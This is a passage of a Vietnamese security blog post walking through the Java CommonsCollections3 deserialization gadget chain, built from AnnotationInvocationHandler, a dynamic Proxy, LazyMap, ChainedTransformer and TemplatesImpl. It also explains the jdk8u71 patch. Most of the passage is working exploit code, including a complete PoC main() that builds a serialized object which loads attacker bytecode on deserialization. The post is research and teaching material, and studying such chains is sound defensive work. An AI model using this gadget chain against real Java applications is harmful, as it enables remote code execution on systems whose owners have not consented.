</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">hashCodeImpl</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;annotationType&#34;</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">type</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">default</span>:
</span></span><span style="display:flex;"><span>                Object var6 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">memberValues</span>.<span style="color:#a6e22e">get</span>(var4);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (var6 <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IncompleteAnnotationException(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">type</span>, var4);
</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (var6 <span style="color:#66d9ef">instanceof</span> ExceptionProxy) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">throw</span> ((ExceptionProxy)var6).<span style="color:#a6e22e">generateException</span>();
</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (var6.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">isArray</span>() <span style="color:#f92672">&amp;&amp;</span> Array.<span style="color:#a6e22e">getLength</span>(var6) <span style="color:#f92672">!=</span> 0) {
</span></span><span style="display:flex;"><span>                        var6 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">cloneArray</span>(var6);
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> var6;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Gọi <code>this.memberValues.get()</code> tại dòng <em>17</em> (set <code>LazyMap</code> tại đây), pass argument <code>var4</code> là 1 String, <code>var4</code> về sau sẽ được pass vào argument của <a href="#ConstantTransformertransform">ConstantTransformer#transform()</a>, cái không liên quan đến việc trả về <code>iConstant</code> hay <code>TrAXFilter.class</code> nên không cần quan tâm.</p>
<p>Vậy làm sao để triggers được method <code>invoke()</code> này</p>
<h4 id="mapproxyentryset-triggers-annotationinvocationhandlerinvoke">Map(Proxy).entrySet() triggers AnnotationInvocationHandler#invoke()</h4>
<p>Class <code>AnnotationInvocationHandler</code> implements interface <code>InvocationHandler</code>, là interface dùng trong implements JDK Proxy:
<img src="/images/2023/Java-deserialization-p1/AnnotationInvocationHandler.png" alt="AnnotationInvocationHandler"></p>
<p>Interface này có method <code>invoke()</code> khá đặc biệt bởi với class implements interface này method <code>invoke()</code> sẽ được tự động gọi bất cứ khi nào ứng dụng gọi một method qua proxy instance được gán invocation handler là class đó, document trong jdk cũng đã miêu tả khá chi tiết:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">InvocationHandler</span> {
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Processes a method invocation on a proxy instance and returns the result. This method will be invoked on an invocation handler when a method is invoked on a proxy instance that it is associated with.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">...
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">invoke</span>(Object proxy, Method method, Object<span style="color:#f92672">[]</span> args)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throws</span> Throwable;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Vậy bây giờ ta cần tạo một lớp Proxy và khai báo invocation handler là class <code>AnnotationInvocationHandler</code>, khi method bất kỳ gọi lớp Proxy này =&gt; <code>AnnotationInvocationHandler#invoke()</code> đóng vai trò là invocation handler sẽ được gọi.</p>
<p>Method bất kỳ cụ thể ở đây này là <code>entrySet()</code> với field <code>memberValues</code> ở line <em>12</em> nằm ngay trong method <code>AnnotationInvocationHandler#readObject()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span>(ObjectInputStream var1) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
</span></span><span style="display:flex;"><span>    var1.<span style="color:#a6e22e">defaultReadObject</span>();
</span></span><span style="display:flex;"><span>    AnnotationType var2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        var2 <span style="color:#f92672">=</span> AnnotationType.<span style="color:#a6e22e">getInstance</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">type</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (IllegalArgumentException var9) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> InvalidObjectException(<span style="color:#e6db74">&#34;Non-annotation type in annotation serial stream&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Map var3 <span style="color:#f92672">=</span> var2.<span style="color:#a6e22e">memberTypes</span>();
</span></span><span style="display:flex;"><span>    Iterator var4 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">memberValues</span>.<span style="color:#a6e22e">entrySet</span>().<span style="color:#a6e22e">iterator</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// truncated ...</span>
</span></span></code></pre></div><p>Có thể set field <code>memberValues</code> qua constructor của class này, field <code>type</code> là có thể là một class interface bất kỳ:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>AnnotationInvocationHandler(Class<span style="color:#f92672">&lt;?</span> <span style="color:#66d9ef">extends</span> Annotation<span style="color:#f92672">&gt;</span> var1, Map<span style="color:#f92672">&lt;</span>String, Object<span style="color:#f92672">&gt;</span> var2) {
</span></span><span style="display:flex;"><span>    Class<span style="color:#f92672">[]</span> var3 <span style="color:#f92672">=</span> var1.<span style="color:#a6e22e">getInterfaces</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (var1.<span style="color:#a6e22e">isAnnotation</span>() <span style="color:#f92672">&amp;&amp;</span> var3.<span style="color:#a6e22e">length</span> <span style="color:#f92672">==</span> 1 <span style="color:#f92672">&amp;&amp;</span> var3<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> Annotation.<span style="color:#a6e22e">class</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">type</span> <span style="color:#f92672">=</span> var1;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">memberValues</span> <span style="color:#f92672">=</span> var2;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> AnnotationFormatError(<span style="color:#e6db74">&#34;Attempt to create proxy for a non-annotation type.&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Để tạo một lớp Proxy trong java runtime, ta có thể tạo Dynamic Proxy sử dụng method sau thuộc <code>java.lang.reflect.Proxy</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">newProxyInstance</span>(ClassLoader loader, Class<span style="color:#f92672">&lt;?&gt;[]</span> interfaces, InvocationHandler h)
</span></span></code></pre></div><p>Khá đầy đủ rồi, viết chain thôi</p>
<h4 id="chain-construction">Chain construction</h4>
<p>Phần sink giống CC4 mình sẽ không giải thích lại:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bArr <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>().<span style="color:#a6e22e">get</span>(evil.<span style="color:#a6e22e">EvilTemplatesImpl</span>.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getName</span>()).<span style="color:#a6e22e">toBytecode</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TemplatesImpl tplsImpl <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
</span></span><span style="display:flex;"><span>setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_bytecodes&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{bArr});
</span></span><span style="display:flex;"><span>setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_name&#34;</span>, <span style="color:#e6db74">&#34;ahihi&#34;</span>);
</span></span><span style="display:flex;"><span>setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_tfactory&#34;</span>, <span style="color:#66d9ef">new</span> TransformerFactoryImpl());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ConstantTransformer constTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ConstantTransformer(TrAXFilter.<span style="color:#a6e22e">class</span>); <span style="color:#75715e">// loop 1 trả về TrAXFilter.class</span>
</span></span><span style="display:flex;"><span>InstantiateTransformer insTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InstantiateTransformer(<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{javax.<span style="color:#a6e22e">xml</span>.<span style="color:#a6e22e">transform</span>.<span style="color:#a6e22e">Templates</span>.<span style="color:#a6e22e">class</span>},
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{tplsImpl}); <span style="color:#75715e">// loop 2 gọi class TrAXFilter constructor</span>
</span></span><span style="display:flex;"><span>ChainedTransformer chainedTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(<span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span>{
</span></span><span style="display:flex;"><span>        constTransformer, insTransformer
</span></span><span style="display:flex;"><span>});
</span></span></code></pre></div><p>Gán chain <code>ChainedTransformer</code> vào field <code>factory</code> của <code>LazyMap</code>, field <code>map</code> gán object <code>HashMap</code> rỗng:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Map map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
</span></span><span style="display:flex;"><span>Map lazyMap <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(map, chainedTransformer); <span style="color:#75715e">// invoke qua factory#transform()</span>
</span></span></code></pre></div><p><img src="/images/2023/Java-deserialization-p1/ChainedTransformer.png" alt="ChainedTransformer"></p>
<p>Để khởi tạo <code>sun.reflect.annotation.AnnotationInvocationHandler</code>, do constructor có thuộc tính <code>private/default</code> nên phải khởi tạo qua reflection:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Class aInvocationHandlerCls <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span>);
</span></span><span style="display:flex;"><span>Constructor aInvocationHandlerConstructor <span style="color:#f92672">=</span> aInvocationHandlerCls.<span style="color:#a6e22e">getDeclaredConstructors</span>()<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>aInvocationHandlerConstructor.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
</span></span></code></pre></div><p>Khởi tạo object <code>AnnotationInvocationHandler</code> thứ nhất, đóng vai trò là invocation handler của lớp proxy. Set field <code>memberValues</code> là <code>lazyMap</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>InvocationHandler proxyHandler <span style="color:#f92672">=</span> (InvocationHandler) aInvocationHandlerConstructor.<span style="color:#a6e22e">newInstance</span>(Override.<span style="color:#a6e22e">class</span>, lazyMap);
</span></span></code></pre></div><p><img src="/images/2023/Java-deserialization-p1/memberValues.png" alt="memberValues"></p>
<p>Tạo dynamic proxy với invocation handler vừa tạo ở trên, Proxy này cần có type là <code>Map</code> như field <code>memberValues</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Map proxyMap <span style="color:#f92672">=</span> (Map) Proxy.<span style="color:#a6e22e">newProxyInstance</span>(
</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getClassLoader</span>(),
</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getInterfaces</span>(),
</span></span><span style="display:flex;"><span>        proxyHandler
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p><img src="/images/2023/Java-deserialization-p1/memberValues2.png" alt="memberValues2"></p>
<p>Cuối cùng, set proxy trên vào field <code>memberValues</code> của <code>AnnotationInvocationHandler</code> object thứ hai, cái sẽ được serialize:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>InvocationHandler aihObj <span style="color:#f92672">=</span> (InvocationHandler) aInvocationHandlerConstructor.<span style="color:#a6e22e">newInstance</span>(Override.<span style="color:#a6e22e">class</span>, proxyMap);
</span></span></code></pre></div><p><img src="/images/2023/Java-deserialization-p1/serialize.png" alt="serialize"></p>
<p>Tổng quan:
<img src="/images/2023/Java-deserialization-p1/CC3diagram.png" alt="CC3diagram"></p>
<h4 id="poc-3">PoC</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bArr <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>().<span style="color:#a6e22e">get</span>(evil.<span style="color:#a6e22e">EvilTemplatesImpl</span>.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getName</span>()).<span style="color:#a6e22e">toBytecode</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    TemplatesImpl tplsImpl <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
</span></span><span style="display:flex;"><span>    setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_bytecodes&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{bArr});
</span></span><span style="display:flex;"><span>    setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_name&#34;</span>, <span style="color:#e6db74">&#34;ahihi&#34;</span>);
</span></span><span style="display:flex;"><span>    setFieldValue(tplsImpl, <span style="color:#e6db74">&#34;_tfactory&#34;</span>, <span style="color:#66d9ef">new</span> TransformerFactoryImpl());
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    ConstantTransformer constTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ConstantTransformer(TrAXFilter.<span style="color:#a6e22e">class</span>); <span style="color:#75715e">// loop 1 trả về TrAXFilter.class</span>
</span></span><span style="display:flex;"><span>    InstantiateTransformer insTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InstantiateTransformer(<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{javax.<span style="color:#a6e22e">xml</span>.<span style="color:#a6e22e">transform</span>.<span style="color:#a6e22e">Templates</span>.<span style="color:#a6e22e">class</span>},
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{tplsImpl}); <span style="color:#75715e">// loop 2 gọi class TrAXFilter constructor</span>
</span></span><span style="display:flex;"><span>    ChainedTransformer chainedTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(<span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span>{
</span></span><span style="display:flex;"><span>            constTransformer, insTransformer
</span></span><span style="display:flex;"><span>    });
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Map map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
</span></span><span style="display:flex;"><span>    Map lazyMap <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(map, chainedTransformer); <span style="color:#75715e">// factory#transform()</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    Class aInvocationHandlerCls <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span>);
</span></span><span style="display:flex;"><span>    Constructor aInvocationHandlerConstructor <span style="color:#f92672">=</span> aInvocationHandlerCls.<span style="color:#a6e22e">getDeclaredConstructors</span>()<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>    aInvocationHandlerConstructor.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Tạo invocation handler cho proxy</span>
</span></span><span style="display:flex;"><span>    InvocationHandler proxyHandler <span style="color:#f92672">=</span> (InvocationHandler) aInvocationHandlerConstructor.<span style="color:#a6e22e">newInstance</span>(Override.<span style="color:#a6e22e">class</span>, lazyMap);
</span></span><span style="display:flex;"><span>    Map proxyMap <span style="color:#f92672">=</span> (Map) Proxy.<span style="color:#a6e22e">newProxyInstance</span>(
</span></span><span style="display:flex;"><span>            map.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getClassLoader</span>(),
</span></span><span style="display:flex;"><span>            map.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getInterfaces</span>(),
</span></span><span style="display:flex;"><span>            proxyHandler
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// sử dụng lại AnnotationInvocationHandler, gán proxyHandler vào field `memberValues`</span>
</span></span><span style="display:flex;"><span>    InvocationHandler aihObj <span style="color:#f92672">=</span> (InvocationHandler) aInvocationHandlerConstructor.<span style="color:#a6e22e">newInstance</span>(Override.<span style="color:#a6e22e">class</span>, proxyMap);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    String serialized <span style="color:#f92672">=</span> serTest(aihObj);
</span></span><span style="display:flex;"><span>    deserTest(serialized);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><img src="/images/2023/Java-deserialization-p1/popup5.png" alt="popup5"></p>
<p>Từ <code>jdk8u71</code>, method <code>AnnotationInvocationHandler#readObject()</code> đã bị sửa, làm đứt chain, diff <code>jdk8u202</code> vs <code>jdk8u66</code>:
<img src="/images/2023/Java-deserialization-p1/diff-jdk8u71.png" alt="diff-jdk8u71"></p>
<h2 id="thoughs">Thoughs</h2>
<p>Bộ CommonsCollections gadget chain với CC2, CC3, CC4 có cùng một sink là <code>TemplatesImpl</code> mà mình đã phân tích cùng với CommonsBeanutils1, các bộ còn lại CC1, CC5, CC6, CC7 cũng chung 1 sink khác là: <code>InvokerTransformer</code> + <code>ChainedTransformer</code> = reflection, cái mình sẽ dành thời gian để viết tiếp part 2.</p>
<h2 id="refs">refs</h2>
<ul>
<li><a href="https://www.cnblogs.com/gk0d/p/16880749.html">https://www.cnblogs.com/gk0d/p/16880749.html</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html">https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html</a></li>
<li><a href="https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads">https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads</a></li>
</ul>

    </div>
  </article>

  
  






  <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/posts">Archives</a></li>
         
          <li><a href="/tags">Tags</a></li>
         
          <li><a href="/about">About</a></li>
        
      </ul>
    </div>

    
    <div id="toc-footer" style="display: none">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#preface">Preface</a></li>
    <li><a href="#load-bytecode">Load bytecode</a>
      <ul>
        <li><a href="#use-classloaderdefineclass-to-load-bytecode-directly">Use ClassLoader#defineClass to load bytecode directly</a></li>
        <li><a href="#load-bytecode-using-templatesimpl">Load bytecode using TemplatesImpl</a></li>
      </ul>
    </li>
    <li><a href="#utilization-chain">Utilization chain</a>
      <ul>
        <li><a href="#commonsbeanutils1">CommonsBeanutils1</a></li>
        <li><a href="#commonscollections2">CommonsCollections2</a></li>
        <li><a href="#commonscollections4">CommonsCollections4</a></li>
        <li><a href="#commonscollections3">CommonsCollections3</a></li>
      </ul>
    </li>
    <li><a href="#thoughs">Thoughs</a></li>
    <li><a href="#refs">refs</a></li>
  </ul>
</nav>
    </div>
    

    <div id="share-footer" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fjava-deserialization-p1%2f" aria-label="Facebook">
      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fjava-deserialization-p1%2f&text=Java%20Deserialization%20p1%20-%20TemplateImpl%20class%20and%20its%20utilization%20chain" aria-label="Twitter">
      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fjava-deserialization-p1%2f&title=Java%20Deserialization%20p1%20-%20TemplateImpl%20class%20and%20its%20utilization%20chain" aria-label="Linkedin">
      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fjava-deserialization-p1%2f&is_video=false&description=Java%20Deserialization%20p1%20-%20TemplateImpl%20class%20and%20its%20utilization%20chain" aria-label="Pinterest">
      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=Java%20Deserialization%20p1%20-%20TemplateImpl%20class%20and%20its%20utilization%20chain&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fjava-deserialization-p1%2f" aria-label="Email">
      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fjava-deserialization-p1%2f&title=Java%20Deserialization%20p1%20-%20TemplateImpl%20class%20and%20its%20utilization%20chain" aria-label="Pocket">
      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fjava-deserialization-p1%2f&title=Java%20Deserialization%20p1%20-%20TemplateImpl%20class%20and%20its%20utilization%20chain" aria-label="reddit">
      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fjava-deserialization-p1%2f&name=Java%20Deserialization%20p1%20-%20TemplateImpl%20class%20and%20its%20utilization%20chain&description=Preface%20com.sun.org.apache.xalan.internal.xsltc.trax.TemplateImpl%20l%c3%a0%20m%e1%bb%99t%20class%20n%e1%ba%b1m%20trong%20th%c6%b0%20vi%e1%bb%87n%20Apache%20Xalan%20c%c3%b3%20s%e1%ba%b5n%20trong%20java%20runtime%20nh%e1%ba%b1m%20ph%e1%bb%a5c%20v%e1%bb%a5%20qu%c3%a1%20tr%c3%acnh%20transform%20XML%20document%2c%20tuy%20nhi%c3%aan%20l%e1%ba%a1i%20b%e1%bb%8b%20l%e1%bb%a3i%20d%e1%bb%a5ng%20r%e1%ba%a5t%20nhi%e1%bb%81u%20trong%20c%c3%a1c%20b%e1%bb%99%20deserialization%20gadget%20chain%20do%20c%c3%b3%20th%e1%bb%83%20th%e1%bb%b1c%20hi%e1%bb%87n%20load%20bytecode%20d%e1%ba%abn%20%c4%91%e1%ba%bfn%20th%e1%bb%b1c%20thi%20command%20t%c3%b9y%20%c3%bd.%20B%c3%a0i%20vi%e1%ba%bft%20s%e1%ba%bd%20ph%c3%a2n%20t%c3%adch%20chi%20ti%e1%ba%bft%20class%20TemplateImpl%20v%c3%a0%20m%e1%bb%99t%20v%c3%a0i%20chain%20ph%e1%bb%95%20bi%e1%ba%bfn%20s%e1%bb%ad%20d%e1%bb%a5ng%20sink%20l%c3%a0%20TemplateImpl%20nh%c6%b0%20b%e1%bb%99%20CommonsBeanutils%20hay%20CommonsCollections%202%2c%203%2c%204." aria-label="Tumblr">
      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fjava-deserialization-p1%2f&t=Java%20Deserialization%20p1%20-%20TemplateImpl%20class%20and%20its%20utilization%20chain" aria-label="Hacker News">
      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>

    <div id="actions-footer">
      
        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>


  <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2024  devme4f blogs 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">Archives</a></li>
         
        <li><a href="/tags">Tags</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>

<script src=/js/code-copy.js></script>




</html>
